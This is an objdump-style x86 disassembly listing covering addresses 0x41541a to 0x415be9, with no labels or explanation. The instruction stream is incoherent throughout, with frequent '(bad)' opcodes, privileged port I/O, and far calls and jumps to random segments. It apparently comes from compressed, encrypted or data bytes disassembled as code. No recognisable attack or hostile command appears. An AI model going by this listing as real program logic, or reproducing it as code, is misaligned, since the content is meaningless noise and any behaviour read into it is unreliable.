  41541a:	cmp    BYTE PTR [eax],cl
  41541c:	push   eax
  41541d:	dec    ebx
  41541e:	sub    al,0xd3
  415420:	aaa    
  415421:	loopne 0x4153fb
  415423:	add    esi,ebp
  415425:	mov    WORD PTR [eax],ss
  415427:	scas   al,BYTE PTR es:[edi]
  415428:	or     ecx,eax
  41542a:	mov    ds:0x40e6c939,eax
  41542f:	sahf   
  415430:	retf   
  415431:	xchg   BYTE PTR [eax+ecx*2],cl
  415434:	and    eax,0x567ef043
  415439:	and    eax,0x658f9452
  41543e:	pop    esp
  41543f:	adc    DWORD PTR [edi+0x2acd1da3],0x31
  415446:	stc    
  415447:	sbb    al,0x74
  415449:	jecxz  0x4153cb
  41544b:	mov    bh,0xf8
  41544d:	scas   eax,DWORD PTR es:[edi]
  41544e:	mov    ch,0x99
  415450:	test   BYTE PTR [ebx],cl
  415452:	daa    
  415453:	hlt    
  415454:	cmp    esp,esp
  415456:	xor    eax,0xbc3f73bf
  41545b:	(bad)  
  41545d:	in     al,0xea
  41545f:	and    edx,DWORD PTR [eax-0x757a5fd6]
  415465:	mov    esi,0xf947cfcd
  41546a:	add    eax,0x632d3551
  41546f:	test   al,0x9c
  415471:	es mov al,0x31
  415474:	mov    es,WORD PTR [ecx+0x8]
  415477:	mov    WORD PTR [edi-0x1],ss
  41547a:	pop    ds
  41547b:	test   eax,0x5ad3c7
  415480:	mov    BYTE PTR [eax-0x68c9f8fe],ch
  415486:	fnsave [edi-0x519ca92]
  41548c:	mov    ebp,0x1b66259f
  415491:	mov    eax,ds:0x32c67c5b
  415496:	shr    BYTE PTR [edi-0x1e],0x6d
  41549a:	call   0xca36:0x83bc15ed
  4154a1:	inc    esp
  4154a2:	pop    edx
  4154a3:	xor    DWORD PTR [ebp+0x2e581d1e],0xd0b99cf4
  4154ad:	fsubr  DWORD PTR [ebx+ebx*8]
  4154b0:	sub    ch,BYTE PTR [eax]
  4154b2:	push   edx
  4154b3:	xchg   ebp,eax
  4154b4:	push   edx
  4154b5:	call   WORD PTR [esi+0x1e]
  4154b9:	or     al,0x64
  4154bb:	ret    0x7068
  4154be:	or     eax,0xc499edba
  4154c3:	hlt    
  4154c4:	inc    ebx
  4154c5:	mov    BYTE PTR [eax],dl
  4154c7:	(bad)  
  4154c8:	mov    edi,0xe67f7e58
  4154cd:	mov    bl,0x37
  4154cf:	mov    ds:0x151dee92,eax
  4154d4:	rep stos DWORD PTR es:[edi],eax
  4154d6:	and    DWORD PTR [ebp+0x4d],esp
  4154d9:	and    BYTE PTR [ebx+ebx*8],ch
  4154dc:	cmc    
  4154dd:	adc    bl,ch
  4154df:	std    
  4154e0:	inc    edx
  4154e1:	mov    ch,0x6c
  4154e3:	in     al,dx
  4154e4:	clc    
  4154e5:	jecxz  0x415508
  4154e7:	inc    esi
  4154e8:	cmp    al,0xc0
  4154ea:	jmp    0x70054a7
  4154ef:	outs   dx,BYTE PTR ds:[esi]
  4154f0:	loop   0x41556c
  4154f2:	rol    BYTE PTR [edi-0x371e225c],cl
  4154f8:	les    edx,FWORD PTR [ebx-0x3195a4c0]
  4154fe:	das    
  4154ff:	imul   esi,DWORD PTR [esi+ebx*2],0x5f3247d8
  415506:	or     DWORD PTR [esp+esi*8-0x1bfc563c],0x1b
  41550e:	adc    dl,BYTE PTR [ebx]
  415510:	pop    esi
  415511:	loop   0x415589
  415513:	aaa    
  415514:	inc    esp
  415515:	and    DWORD PTR [ecx],ebp
  415517:	call   0xd2d06afc
  41551c:	imul   eax,DWORD PTR [edi],0xf
  41551f:	addr16 in eax,0x30
  415522:	(bad)  
  415523:	gs test eax,0xff1ca3ff
  415529:	cmp    esp,ebx
  41552b:	iret   
  41552c:	dec    esp
  41552d:	push   esi
  41552e:	inc    edi
  41552f:	icebp  
  415530:	les    ebp,FWORD PTR [ecx-0x55c62bc7]
  415536:	cmp    DWORD PTR [ebx],ebx
  415538:	(bad)  
  415539:	dec    edi
  41553a:	cmc    
  41553b:	bound  eax,QWORD PTR [edi]
  41553d:	ret    0x5f8b
  415540:	xchg   ebx,eax
  415541:	ins    DWORD PTR es:[edi],dx
  415542:	push   ecx
  415543:	pop    ss
  415544:	or     al,0x66
  415546:	fcom   DWORD PTR [ebx+edi*2-0x7d]
  41554a:	jbe    0x415549
  41554c:	shl    edx,0xee
  41554f:	mov    ds:0x79a085f0,eax
  415554:	lds    eax,FWORD PTR [ebp+0x7b]
  415557:	xor    al,ah
  415559:	shld   DWORD PTR ds:[ebx],edi,cl
  41555d:	lods   al,BYTE PTR ds:[esi]
  41555e:	dec    esp
  41555f:	xor    BYTE PTR [ebx+ecx*4-0x60],0x79
  415564:	push   edi
  415565:	push   eax
  415566:	pop    esp
  415567:	dec    esi
  415568:	push   ds
  415569:	xor    al,0x5d
  41556b:	add    DWORD PTR [eax+0x6bdb23c4],eax
  415571:	jnp    0x415529
  415573:	sbb    ebp,DWORD PTR [edx-0x17]
  415576:	out    0x29,eax
  415578:	pop    edx
  415579:	inc    eax
  41557a:	or     eax,0xb10552f5
  41557f:	dec    edi
  415580:	sub    edi,DWORD PTR [esi]
  415582:	pop    esi
  415583:	mov    cl,BYTE PTR [ebx]
  415585:	pop    ebp
  415586:	mov    edi,0x9b17b9bb
  41558b:	xchg   esi,eax
  41558c:	shl    esi,cl
  41558e:	xlat   BYTE PTR ds:[ebx]
  41558f:	test   al,0x6
  415591:	cmp    al,0x42
  415593:	out    dx,eax
  415594:	inc    ecx
  415595:	pop    ebx
  415596:	int    0xad
  415598:	inc    edx
  415599:	sbb    BYTE PTR [eax-0x3e74fb0d],al
  41559f:	or     al,0x93
  4155a1:	stos   BYTE PTR es:[edi],al
  4155a2:	or     eax,0xb1fcce51
  4155a7:	in     eax,0xa4
  4155a9:	sub    BYTE PTR [edx],dh
  4155ab:	mov    dl,0xa6
  4155ad:	dec    edi
  4155ae:	fimul  WORD PTR [edi+0x5a]
  4155b1:	add    DWORD PTR [esi],esp
  4155b3:	jo     0x41561b
  4155b5:	jae    0x4155ca
  4155b7:	pop    esp
  4155b8:	jge    0x41556c
  4155ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155bb:	dec    esp
  4155bc:	out    dx,al
  4155bd:	cmp    esp,DWORD PTR [ebp+0x36bab2fd]
  4155c3:	cmp    eax,0x3c11d90f
  4155c8:	sub    al,0xe3
  4155ca:	test   BYTE PTR [eax+eiz*1+0x409d3527],0x2c
  4155d2:	jo     0x415605
  4155d4:	xchg   esi,eax
  4155d5:	js     0x415648
  4155d7:	mov    dl,0x70
  4155d9:	nop
  4155da:	punpckhdq mm0,QWORD PTR [edx]
  4155dd:	mov    cl,0xf1
  4155df:	push   ss
  4155e0:	mov    eax,0xbfd0d019
  4155e5:	js     0x415622
  4155e7:	xor    DWORD PTR [esi+eiz*2],0x1b
  4155eb:	sbb    al,0x1c
  4155ed:	inc    edi
  4155ee:	cld    
  4155ef:	pop    ebx
  4155f0:	(bad)  
  4155f2:	and    eax,0xb38856d9
  4155f7:	loope  0x41565f
  4155f9:	and    cl,ah
  4155fb:	xchg   edi,eax
  4155fc:	mov    al,ds:0xaeb6a781
  415601:	and    eax,0xcfe89ac4
  415606:	sbb    eax,0xd2d20623
  41560b:	mov    al,0xf7
  41560d:	cwde   
  41560e:	mov    cl,0x6e
  415610:	pusha  
  415611:	xchg   BYTE PTR [edi-0x51],cl
  415614:	cmp    eax,0x77b659d7
  415619:	sti    
  41561a:	push   esi
  41561b:	mov    edi,0x8e4c06f3
  415620:	mov    eax,ds:0x5c32caf6
  415625:	sbb    edi,eax
  415627:	xchg   BYTE PTR [ebx],cl
  415629:	lea    eax,[esp+eiz*8]
  41562c:	stos   BYTE PTR es:[edi],al
  41562d:	in     al,dx
  41562e:	test   BYTE PTR [ecx+0x4e],dh
  415631:	or     DWORD PTR ss:[edi-0x3c],esp
  415635:	push   eax
  415636:	mov    ebp,0xe1a0a672
  41563b:	lock fbstp TBYTE PTR [edx-0x19]
  41563f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415640:	imul   ebx,DWORD PTR ds:0x5a61c25c,0xa848497e
  41564a:	and    al,0x3
  41564c:	inc    ebx
  41564d:	mov    esp,0x26f55bb9
  415652:	pop    ecx
  415653:	(bad)  
  415654:	push   edx
  415655:	or     ecx,DWORD PTR [edx+0x2b]
  415658:	outs   dx,DWORD PTR ds:[esi]
  415659:	cmp    BYTE PTR [edx+0x3c],bh
  41565c:	repz mov ds:0xa547edc7,al
  415662:	mov    edi,0xb4f4de23
  415667:	xlat   BYTE PTR ds:[ebx]
  415668:	pop    ecx
  415669:	adc    BYTE PTR [esi],ah
  41566b:	mov    ch,0xc9
  41566d:	or     al,0x11
  41566f:	sub    al,BYTE PTR [ebp+esi*1+0xf]
  415673:	lahf   
  415674:	jle    0x4156e3
  415676:	jmp    0xf227:0x2e3f9334
  41567d:	and    BYTE PTR [ecx-0x3f],ah
  415680:	push   0x5bb46c28
  415685:	and    ecx,DWORD PTR [eax]
  415687:	rcl    ebp,0xe8
  41568a:	jmp    0xf496bfaf
  41568f:	mov    bh,0xcf
  415691:	pop    esp
  415692:	mov    ds:0x2abb4a4c,al
  415697:	popf   
  415698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415699:	pop    ecx
  41569a:	fnstenv [ebp+0x4a]
  41569d:	adc    bl,ch
  41569f:	xchg   esp,eax
  4156a0:	mov    ss,WORD PTR [edi-0x2ec0fd2]
  4156a6:	fwait
  4156a7:	into   
  4156a8:	imul   ebx,DWORD PTR [edi],0x77d3bd2a
  4156ae:	mov    al,ds:0x47a1f86a
  4156b3:	imul   edi,edi,0xffffffcb
  4156b6:	sub    BYTE PTR [ebp-0x5e],bh
  4156b9:	push   ebx
  4156bb:	sub    al,0xee
  4156bd:	in     al,dx
  4156be:	les    ebp,FWORD PTR es:[edx+0x4b]
  4156c2:	imul   ebx,DWORD PTR [esi],0x7
  4156c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156c6:	in     eax,0x3d
  4156c8:	addr16 mov bl,0x22
  4156cb:	sub    eax,0x45ee4756
  4156d0:	(bad)  
  4156d1:	in     al,dx
  4156d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156d3:	add    eax,0xac64f737
  4156d8:	retf   0x14
  4156db:	xor    dh,al
  4156dd:	push   edx
  4156de:	xor    al,0x4c
  4156e0:	xchg   esp,eax
  4156e1:	jg     0x41567a
  4156e3:	pop    eax
  4156e4:	loopne 0x415707
  4156e6:	dec    esi
  4156e7:	mov    ah,0x8b
  4156e9:	fisub  DWORD PTR [esi-0x35e2488b]
  4156ef:	fidiv  DWORD PTR [edi+0x1183f875]
  4156f5:	pop    DWORD PTR [edi-0x30]
  4156f8:	push   ds
  4156f9:	or     ebx,ebp
  4156fb:	add    ebp,DWORD PTR [edx+0x28114af2]
  415701:	and    BYTE PTR [eax+edi*1-0x28b8581c],dh
  415708:	fs dec edi
  41570a:	add    esp,DWORD PTR [edi]
  41570c:	xchg   ebx,eax
  41570d:	(bad)  
  41570e:	cmp    cl,BYTE PTR [esp+edi*4-0x42]
  415712:	pop    esi
  415713:	in     al,dx
  415714:	xchg   ebx,eax
  415715:	or     esp,eax
  415717:	sahf   
  415718:	push   edi
  415719:	add    al,0xb8
  41571b:	mov    al,ds:0xb5886209
  415720:	lods   eax,DWORD PTR ds:[esi]
  415721:	jg     0x41577b
  415723:	neg    DWORD PTR [edx]
  415725:	int3   
  415726:	mov    ebp,ebp
  415728:	outs   dx,DWORD PTR ds:[esi]
  415729:	xchg   ebp,eax
  41572a:	dec    ebx
  41572b:	inc    esi
  41572c:	adc    cl,ah
  41572e:	push   0xbb9aef03
  415733:	sub    esp,edi
  415735:	mov    ds:0xf597e147,al
  41573a:	adc    BYTE PTR [edi],al
  41573c:	in     eax,0x93
  41573e:	mov    bh,0x6f
  415740:	popa   
  415741:	xchg   edi,eax
  415742:	int3   
  415743:	and    bh,bl
  415745:	adc    BYTE PTR [esi],al
  415747:	(bad)  
  415748:	lea    ebx,[eax+0x4b]
  41574b:	jmp    DWORD PTR [esp+ebx*4+0x5c]
  41574f:	shl    DWORD PTR [esi],cl
  415751:	sub    eax,DWORD PTR [ebx+0x7ffe4285]
  415757:	fistp  QWORD PTR [ebx]
  415759:	retf   
  41575a:	aas    
  41575b:	xor    ch,BYTE PTR [edx]
  41575d:	dec    ebx
  41575e:	pop    ebp
  41575f:	sbb    bh,bh
  415761:	das    
  415762:	je     0x41577c
  415764:	dec    ecx
  415765:	adc    BYTE PTR [edx+0x7aa262e7],0xa4
  41576c:	mov    dh,0xc
  41576e:	cli    
  41576f:	dec    ebx
  415770:	jl     0x41576b
  415772:	add    al,BYTE PTR [edx+ebp*2-0x34e885ea]
  415779:	in     eax,0xf1
  41577b:	push   ebx
  41577c:	cmp    DWORD PTR [ebx+eax*4+0x4],eax
  415780:	aaa    
  415781:	loopne 0x415705
  415783:	or     BYTE PTR [ebx+0x534b2c3d],cl
  415789:	mov    bl,0x22
  41578b:	sbb    eax,0x890446bb
  415790:	jbe    0x4157b1
  415792:	gs ss adc al,0x66
  415796:	push   ebx
  415797:	mov    WORD PTR [eax+0x1ff9af0e],es
  41579d:	or     al,0xf8
  41579f:	ss iret 
  4157a1:	mov    cl,0x89
  4157a3:	xchg   esp,eax
  4157a4:	mov    esi,0xb98f4e9b
  4157a9:	clc    
  4157aa:	out    dx,al
  4157ab:	pop    es
  4157ac:	lea    esp,[esi]
  4157ae:	shl    DWORD PTR [esi],0x5b
  4157b1:	pop    ss
  4157b2:	jecxz  0x41579e
  4157b4:	or     eax,0xd2b04d6b
  4157b9:	ins    DWORD PTR es:[edi],dx
  4157ba:	fld    TBYTE PTR [ecx-0x1ed6455]
  4157c0:	push   ss
  4157c1:	xchg   edx,eax
  4157c2:	enter  0x8581,0xe
  4157c6:	in     eax,0xb3
  4157c8:	inc    ecx
  4157c9:	adc    bh,BYTE PTR [eax-0x367bb3f9]
  4157cf:	mov    dh,0x30
  4157d1:	(bad)  
  4157d3:	jb     0x415767
  4157d5:	shl    cl,0x70
  4157d8:	jo     0x4157d7
  4157da:	xchg   ebp,eax
  4157db:	cmp    ah,dh
  4157dd:	cvtps2pd xmm4,QWORD PTR [ecx-0x76a96dd8]
  4157e4:	hlt    
  4157e5:	retf   
  4157e6:	lock fistp WORD PTR [ebx-0x75b77e65]
  4157ed:	or     DWORD PTR [eax-0x4f],edi
  4157f0:	mov    eax,ds:0x5f3d00dc
  4157f5:	or     dh,bl
  4157f7:	sub    esp,edi
  4157f9:	adc    DWORD PTR [ecx+edi*1+0x48b4de90],esi
  415800:	(bad)  
  415801:	sbb    eax,DWORD PTR [edx-0x6ad7036c]
  415807:	cwde   
  415808:	mov    esp,0xb2579ba5
  41580d:	xchg   dx,ax
  41580f:	xchg   ebp,eax
  415810:	sbb    al,BYTE PTR [ecx+0x3a13295a]
  415816:	mov    eax,ds:0x8848cc3f
  41581b:	xchg   edi,eax
  41581c:	arpl   WORD PTR [esi-0x285ee6aa],si
  415822:	aad    0x8f
  415824:	add    ecx,DWORD PTR [esi+edx*2]
  415827:	jbe    0x41583c
  415829:	mov    ecx,0x9f0e752a
  41582e:	lahf   
  41582f:	xchg   ecx,eax
  415830:	test   ecx,edx
  415832:	or     BYTE PTR cs:[eax-0x49],0x62
  415837:	xor    DWORD PTR [edx],0x64
  41583a:	mov    dh,0xaf
  41583c:	mov    ds:0xac89d30e,al
  415841:	lock out dx,al
  415843:	test   BYTE PTR [eax-0x27be306e],0x46
  41584a:	repnz loopne 0x4158b7
  41584d:	pop    ds
  41584e:	push   eax
  41584f:	paddusw mm1,mm2
  415852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415853:	inc    eax
  415854:	xor    DWORD PTR [edi+0x61],0x72
  415858:	dec    ebx
  415859:	or     BYTE PTR [ebp-0x951f61e],al
  41585f:	shl    DWORD PTR [eax+0xb],cl
  415862:	(bad)  
  415863:	out    dx,eax
  415864:	add    al,0xd
  415866:	jmp    0x7bbf7f4c
  41586b:	push   edx
  41586c:	dec    ecx
  41586d:	dec    esp
  41586e:	fisttp DWORD PTR [edx]
  415870:	cmp    edi,0xccfcf043
  415876:	hlt    
  415877:	(bad)  
  415878:	ds daa 
  41587a:	dec    ecx
  41587b:	mov    esp,0x17adc3d5
  415880:	mov    WORD PTR [esi],gs
  415882:	out    0x40,eax
  415884:	add    eax,0x3c459123
  415889:	es jle 0x41585c
  41588c:	pop    ebx
  41588d:	mov    al,0x4f
  41588f:	inc    ebx
  415890:	and    eax,0x59f1d1c4
  415895:	add    DWORD PTR [esi+eiz*8+0x10],ecx
  415899:	mov    dh,0xf4
  41589b:	jne    0x4158ac
  41589d:	fs mov ch,dl
  4158a0:	xchg   edi,eax
  4158a1:	std    
  4158a2:	cld    
  4158a3:	adc    dh,BYTE PTR [edx]
  4158a5:	imul   edx,ebp,0x63
  4158a8:	(bad)  
  4158aa:	add    al,0x31
  4158ac:	xchg   ebp,eax
  4158ad:	and    dh,ch
  4158af:	jns    0x4158bb
  4158b1:	ins    DWORD PTR es:[edi],dx
  4158b2:	cmp    ebx,DWORD PTR [eax+0x2195d322]
  4158b8:	adc    eax,0x96345263
  4158bd:	jl     0x415877
  4158bf:	call   0x9cc044d0
  4158c4:	add    edi,DWORD PTR [esi]
  4158c6:	stos   DWORD PTR es:[edi],eax
  4158c7:	and    dh,BYTE PTR [ebp-0x641c5018]
  4158cd:	xor    DWORD PTR [ebx],ebp
  4158cf:	xor    al,0x7f
  4158d1:	shr    DWORD PTR [ebx],0xa3
  4158d4:	sbb    esp,DWORD PTR [ebx+0x16]
  4158d7:	or     al,0xb2
  4158d9:	or     eax,0xbe862fdd
  4158de:	idiv   esi
  4158e0:	add    BYTE PTR [edx+0x4e],bl
  4158e3:	sub    al,al
  4158e5:	test   eax,0xdc8392ca
  4158ea:	neg    BYTE PTR [ecx-0x61]
  4158ed:	jge    0x415925
  4158ef:	in     al,0x55
  4158f1:	jmp    0x415885
  4158f3:	jle    0x41594f
  4158f5:	pop    esi
  4158f6:	gs pop edx
  4158f8:	xlat   BYTE PTR ds:[ebx]
  4158f9:	inc    ebp
  4158fa:	out    dx,eax
  4158fb:	or     al,0x76
  4158fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158fe:	mov    esp,0x5b169b8c
  415903:	adc    ebx,ecx
  415905:	ret    0x6e67
  415908:	dec    edi
  415909:	stc    
  41590a:	xchg   ecx,eax
  41590b:	test   DWORD PTR [ecx-0x9],ebx
  41590e:	das    
  41590f:	push   ss
  415910:	loopne 0x415978
  415912:	xor    BYTE PTR [edx+0x75],cl
  415915:	add    eax,0xd1ee13d3
  41591a:	bound  edx,QWORD PTR [esi-0x6a]
  41591d:	or     dh,dl
  41591f:	inc    esi
  415920:	inc    ebp
  415921:	mov    ebx,0x2f6a9ca5
  415926:	sbb    al,bl
  415928:	loope  0x415985
  41592a:	cmp    bh,dl
  41592c:	pop    esi
  41592d:	push   ss
  41592e:	mov    edx,0xa0763a17
  415933:	jmp    0x4158e7
  415935:	mov    eax,ds:0x7cd2fcc2
  41593a:	lods   eax,DWORD PTR ds:[esi]
  41593b:	arpl   WORD PTR [esi],ax
  41593d:	dec    eax
  41593e:	ds push esp
  415940:	js     0x4158e3
  415942:	std    
  415943:	jnp    0x415928
  415945:	mov    al,ds:0xb6dc754a
  41594a:	mov    ebp,0xe0f59c9b
  41594f:	addr16 dec ebp
  415951:	dec    esi
  415952:	or     dl,dh
  415954:	sbb    esi,DWORD PTR [ebx]
  415956:	int3   
  415957:	ds ja  0x4159bb
  41595a:	stos   BYTE PTR es:[edi],al
  41595b:	inc    eax
  41595c:	cs mov edi,cs
  41595f:	push   edi
  415960:	inc    eax
  415961:	shl    DWORD PTR [edx],1
  415963:	pop    ecx
  415964:	xor    ecx,DWORD PTR [edx]
  415966:	xchg   edx,eax
  415967:	jg     0x415974
  415969:	out    0x4a,al
  41596b:	stc    
  41596c:	idiv   DWORD PTR [edi+0x69639690]
  415972:	shl    DWORD PTR [eax+0x5090260a],1
  415978:	shl    DWORD PTR [ebx-0x3277798],cl
  41597e:	mov    ch,0x73
  415980:	jns    0x415970
  415982:	cmc    
  415983:	pop    ecx
  415984:	inc    ebp
  415985:	adc    edx,DWORD PTR [ebp+0x299d2969]
  41598b:	push   esp
  41598c:	fiadd  WORD PTR [esi+esi*8-0x74023388]
  415993:	jno    0x41594c
  415995:	xchg   DWORD PTR [ecx],eax
  415997:	jle    0x4159dc
  415999:	ficomp WORD PTR [ecx]
  41599b:	inc    edi
  41599c:	push   cs
  41599d:	mov    dl,cl
  41599f:	mov    cs,WORD PTR [esi-0xebeb99d]
  4159a5:	jns    0x4159a1
  4159a7:	pop    edi
  4159a8:	jl     0x415a1c
  4159aa:	xor    al,BYTE PTR [ebx+ebp*8-0x1c789e8f]
  4159b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159b2:	lahf   
  4159b3:	vpunpckhdq ymm5,ymm4,ymm2
  4159b7:	xchg   edi,eax
  4159b8:	xrelease lock adc DWORD PTR [ebx-0x3d055d5e],esi
  4159c0:	and    eax,DWORD PTR [edi-0x49b2992c]
  4159c6:	in     eax,dx
  4159c7:	mov    bh,BYTE PTR [ebp-0x2acb84e6]
  4159cd:	sbb    DWORD PTR [eax-0x51],0xb93af65c
  4159d4:	cs xor al,0x39
  4159d7:	push   ds
  4159d8:	iret   
  4159d9:	fiadd  DWORD PTR [eax+0x5bac9293]
  4159df:	cdq    
  4159e0:	push   0x3c
  4159e2:	outs   dx,DWORD PTR ds:[esi]
  4159e3:	enter  0x50f0,0xd8
  4159e7:	xor    BYTE PTR [edx+0x79],al
  4159ea:	xchg   edx,eax
  4159eb:	jp     0x415a33
  4159ed:	aad    0x1c
  4159ef:	add    al,0xc7
  4159f1:	sbb    edx,DWORD PTR [ecx+0x57543428]
  4159f7:	outs   dx,DWORD PTR ds:[esi]
  4159f8:	cmc    
  4159f9:	in     eax,dx
  4159fa:	daa    
  4159fb:	stos   BYTE PTR es:[edi],al
  4159fc:	out    0x5e,al
  4159fe:	or     eax,0xb399c1a
  415a03:	sbb    eax,0xdca68f45
  415a08:	or     BYTE PTR [esp+eax*4],bl
  415a0b:	sub    al,0x3e
  415a0d:	or     BYTE PTR [ebp-0x27],0xfa
  415a11:	loop   0x4159cd
  415a13:	push   ds
  415a14:	pop    ds
  415a15:	idiv   BYTE PTR [ebp+ebp*4+0x5b]
  415a19:	leave  
  415a1a:	rol    dh,1
  415a1c:	mov    dl,0xb9
  415a1e:	push   ecx
  415a1f:	jnp    0x4159ac
  415a21:	jle    0x415a80
  415a23:	jmp    0x73b5042a
  415a28:	cmp    dl,BYTE PTR [edx]
  415a2a:	sbb    al,0xeb
  415a2c:	push   cs
  415a2d:	adc    DWORD PTR [ebx+0x3fee078d],edi
  415a33:	das    
  415a34:	ficomp WORD PTR [eax-0x79]
  415a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a38:	cmp    eax,0x129b7bcf
  415a3d:	pop    edi
  415a3e:	sub    DWORD PTR [edi+eiz*1],esi
  415a41:	xchg   edi,eax
  415a42:	js     0x415a11
  415a44:	xchg   ebx,eax
  415a45:	mov    al,0xc3
  415a47:	loop   0x415a31
  415a49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a4a:	sub    al,al
  415a4c:	arpl   WORD PTR [ecx+edx*2+0x766f1c4d],ax
  415a53:	jg     0x415aa7
  415a55:	dec    esp
  415a56:	sbb    ebx,ecx
  415a58:	mov    dx,bx
  415a5b:	dec    edx
  415a5c:	daa    
  415a5d:	fs cld 
  415a5f:	data16 add BYTE PTR [edi-0x7f],0x21
  415a64:	imul   ebx,DWORD PTR [edi-0x23785977],0x4a
  415a6b:	sbb    cl,BYTE PTR [edi]
  415a6d:	dec    dx
  415a6f:	mov    ch,BYTE PTR [esi-0x29]
  415a72:	pop    ss
  415a73:	aam    0xef
  415a75:	popf   
  415a76:	(bad)  
  415a78:	and    dl,dl
  415a7a:	adc    DWORD PTR [esi-0x11],0x248411d9
  415a81:	xchg   ebx,eax
  415a82:	scas   al,BYTE PTR es:[edi]
  415a83:	outs   dx,BYTE PTR ds:[esi]
  415a84:	push   ebp
  415a85:	popf   
  415a86:	mov    ebx,0x1250a3fb
  415a8b:	je     0x415a46
  415a8d:	pop    ss
  415a8e:	jmp    0x9ba71d79
  415a93:	and    al,BYTE PTR [esi+0x269f37f7]
  415a99:	jns    0x415a46
  415a9b:	imul   edi,DWORD PTR [esp+ecx*4],0x74
  415a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aa0:	enter  0xd17b,0x7f
  415aa4:	mov    ?,WORD PTR [ecx+eiz*2+0x78e711e4]
  415aab:	call   0x352:0x26683124
  415ab2:	lahf   
  415ab3:	and    DWORD PTR [edi+0x12],edx
  415ab6:	fimul  WORD PTR [ecx+0x32]
  415ab9:	adc    DWORD PTR [edx-0x30],0x56
  415abd:	pop    edi
  415abe:	mov    ch,0x98
  415ac0:	push   edi
  415ac1:	out    0xe8,eax
  415ac3:	inc    ebx
  415ac4:	mov    esp,0xd87ebb1c
  415ac9:	and    edi,DWORD PTR [esp+0x60]
  415acd:	jo     0x415b29
  415acf:	pop    ds
  415ad0:	fadd   QWORD PTR [eax-0x56077535]
  415ad6:	mov    edx,fs
  415ad8:	popf   
  415ad9:	dec    esi
  415ada:	sub    ah,bh
  415adc:	adc    al,0xcb
  415ade:	inc    esi
  415adf:	hlt    
  415ae0:	add    al,dl
  415ae2:	xor    esi,ecx
  415ae4:	pop    edx
  415ae5:	jno    0x415aff
  415ae7:	and    dl,BYTE PTR [edi+0x56]
  415aea:	(bad)  
  415aeb:	enter  0x1063,0x9
  415aef:	lods   eax,DWORD PTR ds:[esi]
  415af0:	pop    ebx
  415af1:	sub    al,0xc2
  415af3:	std    
  415af4:	leave  
  415af5:	and    al,0x61
  415af7:	inc    ebp
  415af8:	addr16 inc esi
  415afa:	pop    esp
  415afb:	push   ebx
  415afc:	xor    esp,DWORD PTR [eax]
  415afe:	dec    eax
  415aff:	mov    al,0x3
  415b01:	pop    ds
  415b02:	jno    0x415a90
  415b04:	jmp    0x82b6fcab
  415b09:	lods   eax,DWORD PTR ds:[esi]
  415b0a:	adc    al,ch
  415b0c:	jle    0x415a9c
  415b0e:	xor    eax,0xaa02566e
  415b13:	sub    BYTE PTR [ecx-0x5a3a438a],al
  415b19:	or     DWORD PTR [esi+0x15],0x582a5cef
  415b20:	xchg   ebx,eax
  415b21:	mov    dh,0x9c
  415b23:	add    DWORD PTR [ebp+0x8b9ed77],0x1c5d7c38
  415b2d:	mov    dl,0x3d
  415b2f:	lods   eax,DWORD PTR ds:[esi]
  415b30:	push   0xf071f4bb
  415b35:	ja     0x415b98
  415b37:	adc    BYTE PTR [ebp+edi*2+0x7f],bl
  415b3b:	call   0x1330:0x8a64d4dc
  415b42:	mov    bl,0x1f
  415b44:	pop    eax
  415b45:	dec    ecx
  415b46:	pop    eax
  415b47:	jae    0x415bc8
  415b49:	lods   al,BYTE PTR ds:[esi]
  415b4a:	mov    cl,0x92
  415b4c:	js     0x415b40
  415b4e:	push   0x5e
  415b50:	enter  0xb8e2,0x98
  415b54:	pop    ebp
  415b55:	arpl   WORD PTR [ebp+0x777d6d8c],bp
  415b5b:	repz (bad) 
  415b5d:	jmp    0x415b8e
  415b5f:	mov    eax,0xdb511b1e
  415b64:	outs   dx,DWORD PTR ds:[esi]
  415b65:	and    bh,ch
  415b67:	mov    ebp,0x76c22076
  415b6c:	mov    dh,BYTE PTR [ebp+ebp*4-0x22ad33a3]
  415b73:	jecxz  0x415b01
  415b75:	jnp    0x415bbc
  415b77:	jns    0x415b53
  415b79:	mov    cl,0xfd
  415b7b:	daa    
  415b7c:	std    
  415b7d:	rcl    BYTE PTR [esi],0x4d
  415b80:	stc    
  415b81:	or     al,BYTE PTR [ebx]
  415b83:	cmp    ecx,DWORD PTR [edx-0x3529c15b]
  415b89:	cwde   
  415b8a:	(bad)
  415b8d:	mov    ax,ds:0x6718ac1d
  415b93:	sub    al,0x30
  415b95:	sti    
  415b96:	jecxz  0x415bed
  415b98:	mov    al,0xbb
  415b9a:	inc    ebx
  415b9b:	jbe    0x415bb2
  415b9d:	aad    0xbf
  415b9f:	add    BYTE PTR [ecx+0x3f],cl
  415ba2:	inc    esi
  415ba3:	fsub   DWORD PTR [edi]
  415ba5:	mov    ds:0x27a0e8dc,al
  415baa:	adc    eax,0xac160dab
  415baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bb0:	push   esp
  415bb1:	or     esi,DWORD PTR [ebx-0x56]
  415bb4:	jp     0x415c0d
  415bb6:	(bad)  
  415bb7:	mov    ah,0x88
  415bb9:	push   esi
  415bba:	sub    eax,0xe18ac415
  415bbf:	scas   al,BYTE PTR es:[edi]
  415bc0:	push   cs
  415bc1:	jmp    0xa8a7:0x7f9e9f56
  415bc8:	push   edi
  415bc9:	mov    edx,0x36aa1be9
  415bce:	dec    edi
  415bcf:	pop    DWORD PTR [esi]
  415bd1:	nop
  415bd2:	sub    BYTE PTR [esi],bl
  415bd4:	dec    edx
  415bd5:	pop    es
  415bd6:	jmp    0x415c06
  415bd8:	add    BYTE PTR [eax],dh
  415bda:	stos   BYTE PTR es:[edi],al
  415bdb:	jb     0x415c59
  415bdd:	adc    edx,DWORD PTR [ecx+0x6e]
  415be0:	mov    ah,0x39
  415be2:	push   esi
  415be3:	push   0x72335385
  415be8:	pop    eax
  415be9:	adc    cl,dh
